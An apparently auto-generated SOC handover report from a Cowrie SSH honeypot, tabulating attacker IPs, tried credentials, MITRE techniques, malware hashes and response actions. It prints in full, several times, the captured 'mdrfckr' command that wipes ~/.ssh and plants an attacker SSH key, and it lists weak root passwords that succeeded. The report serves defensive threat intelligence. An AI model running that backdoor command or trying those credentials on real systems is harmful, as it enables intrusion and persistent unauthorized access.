# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-30 |
| **Generated At** | 2026-03-30T16:54:07Z |
| **Shift Time** | 16:54 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **25** |
| Confirmed Threats | **20** |
| False Positives Filtered | **5** (20.0%) |
| Unique Attacker IPs | **21** |
| Countries of Origin | **13** |
| High Severity Cases | **4** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **21** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **18** |
| Unique Credential Pairs | **16** |
| Unique Usernames | **13** |
| Unique Passwords | **16** |
| Successful Auth Pairs | **4** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 4 |
| `345gs5662d34` | 2 |
| `support` | 2 |
| `Guest` | 1 |
| `Root` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 2 |
| `3245gs5662d34` | 2 |
| `qwerty1` | 1 |
| `qwer1234` | 1 |
| `config777` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 2 |
| `root` | `3245gs5662d34` | 2 |
| `Guest` | `qwerty1` | 1 |
| `Root` | `qwer1234` | 1 |
| `config` | `config777` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `111qqq...` | `189.146.58.128` | 2026-03-30T15:59:39 |
| `root` | `3245gs5662d34` | `189.146.58.128` | 2026-03-30T15:59:46 |
| `root` | `nnrzs2008` | `197.243.0.62` | 2026-03-30T16:04:05 |
| `root` | `3245gs5662d34` | `197.243.0.62` | 2026-03-30T16:04:11 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `189.146.58.128`, `197.243.0.62`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **21** |
| Unique ASNs | **21** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS60223` | Netiface | 1 | HIGH |
| `AS17665` | ONEOTT INTERTAINMENT LIMITED | 1 | HIGH |
| `AS14061` | DigitalOcean, LLC | 1 | LOW |
| `AS8492` | OBIT Ltd. | 1 | MEDIUM |
| `AS396982` | Google LLC | 1 | LOW |
| `AS30377` | MacStadium, Inc. | 1 | HIGH |
| `AS9658` | Eastern Telecoms Phils., Inc. | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (4)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-0c9f0f025e77

| Field | Detail |
|---|---|
| **Source IP** | `189.146.58[.]128` |
| **First Seen** | 2026-03-30 15:59 |
| **Last Seen** | 2026-03-30 15:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 15:59:38` | `cowrie.session.connect` |
| `2026-03-30 15:59:38` | `cowrie.client.version` |
| `2026-03-30 15:59:38` | `cowrie.client.kex` |
| `2026-03-30 15:59:39` | `cowrie.login.success` |
| `2026-03-30 15:59:40` | `cowrie.session.params` |
| `2026-03-30 15:59:40` | `cowrie.command.input` |
| `2026-03-30 15:59:40` | `cowrie.command.failed` |
| `2026-03-30 15:59:40` | `cowrie.log.closed` |
| `2026-03-30 15:59:41` | `cowrie.session.params` |
| `2026-03-30 15:59:41` | `cowrie.command.input` |
| `2026-03-30 15:59:41` | `cowrie.session.file_download` |
| `2026-03-30 15:59:41` | `cowrie.log.closed` |
| `2026-03-30 15:59:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.146.58[.]128` to AbuseIPDB if not already reported
- [ ] Block `189.146.58[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7f5464fd34f

| Field | Detail |
|---|---|
| **Source IP** | `189.146.58[.]128` |
| **First Seen** | 2026-03-30 15:59 |
| **Last Seen** | 2026-03-30 15:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 15:59:45` | `cowrie.session.connect` |
| `2026-03-30 15:59:45` | `cowrie.client.version` |
| `2026-03-30 15:59:45` | `cowrie.client.kex` |
| `2026-03-30 15:59:46` | `cowrie.login.success` |
| `2026-03-30 15:59:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.146.58[.]128` to AbuseIPDB if not already reported
- [ ] Block `189.146.58[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-731fbe224142

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-03-30 16:04 |
| **Last Seen** | 2026-03-30 16:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 16:04:04` | `cowrie.session.connect` |
| `2026-03-30 16:04:04` | `cowrie.client.version` |
| `2026-03-30 16:04:04` | `cowrie.client.kex` |
| `2026-03-30 16:04:05` | `cowrie.login.success` |
| `2026-03-30 16:04:06` | `cowrie.session.params` |
| `2026-03-30 16:04:06` | `cowrie.command.input` |
| `2026-03-30 16:04:06` | `cowrie.command.failed` |
| `2026-03-30 16:04:06` | `cowrie.log.closed` |
| `2026-03-30 16:04:07` | `cowrie.session.params` |
| `2026-03-30 16:04:07` | `cowrie.command.input` |
| `2026-03-30 16:04:07` | `cowrie.session.file_download` |
| `2026-03-30 16:04:07` | `cowrie.log.closed` |
| `2026-03-30 16:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edcb8fed304b

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-03-30 16:04 |
| **Last Seen** | 2026-03-30 16:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 16:04:10` | `cowrie.session.connect` |
| `2026-03-30 16:04:10` | `cowrie.client.version` |
| `2026-03-30 16:04:10` | `cowrie.client.kex` |
| `2026-03-30 16:04:11` | `cowrie.login.success` |
| `2026-03-30 16:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `104.152.58[.]233` | 1 | 2026-03-30 15:02 | 2026-03-30 15:02 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `113.219.177[.]95` | 1 | 2026-03-30 16:41 | 2026-03-30 16:41 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `181.188.149[.]243` | 1 | 2026-03-30 15:22 | 2026-03-30 15:22 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.239.20[.]236` | 1 | 2026-03-30 15:48 | 2026-03-30 15:48 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `185.242.3[.]105` | 1 | 2026-03-30 15:49 | 2026-03-30 15:49 | 29s | 0 | `T1592` | 🟢 LOW |
| `186.222.55[.]187` | 1 | 2026-03-30 16:23 | 2026-03-30 16:23 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `189.146.58[.]128` | 1 | 2026-03-30 15:59 | 2026-03-30 15:59 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `197.243.0[.]62` | 1 | 2026-03-30 16:04 | 2026-03-30 16:04 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `203.192.211[.]180` | 1 | 2026-03-30 16:47 | 2026-03-30 16:47 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `207.254.22[.]207` | 1 | 2026-03-30 15:23 | 2026-03-30 15:23 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.240.236[.]116` | 1 | 2026-03-30 15:18 | 2026-03-30 15:18 | 10s | 0 | `T1592` | 🟢 LOW |
| `70.89.116[.]5` | 1 | 2026-03-30 15:42 | 2026-03-30 15:42 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `71.12.241[.]225` | 1 | 2026-03-30 16:03 | 2026-03-30 16:03 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `75.3.103[.]252` | 1 | 2026-03-30 16:27 | 2026-03-30 16:27 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `79.143.42[.]170` | 1 | 2026-03-30 16:00 | 2026-03-30 16:01 | 31s | 0 | `T1592` | 🟢 LOW |
| `91.126.87[.]238` | 1 | 2026-03-30 15:58 | 2026-03-30 15:58 | 2s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `104.152.58[.]233` | US | VOLICO | **100** ⚠️ | 8 |
| `70.89.116[.]5` | US | Comcast Cable Communications, LLC | **100** ⚠️ | 50 |
| `183.239.20[.]236` | CN | China Mobile Communications Corporation | **100** ⚠️ | 14 |
| `71.12.241[.]225` | US | Charter Communications LLC | **100** ⚠️ | 40 |
| `185.242.3[.]105` | DE | Felcloud | **100** ⚠️ | 50 |
| `203.192.211[.]180` | IN | Indusind Media And Communication Ltd. | **100** ⚠️ | 6 |
| `75.3.103[.]252` | US | Private Customer - AT&T Internet Services | **100** ⚠️ | 7 |
| `113.219.177[.]95` | CN | CHINANET HUNAN PROVINCE NETWORK | **100** ⚠️ | 50 |
| `197.243.0[.]62` | RW | Broadband Systems Corporation | **100** ⚠️ | 46 |
| `189.146.58[.]128` | MX | Gestión de direccionamiento UniNet | **100** ⚠️ | 4 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 19 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 14 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 4 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |

---

## 🔕 False Positive Summary (5 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 25 cases |
| Tool 34  | Credential Extractor        | ✅ 18 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 21 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 5 filtered (20.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 21 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 4 priority case(s) shown individually · 16 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-30T16:54:07Z_
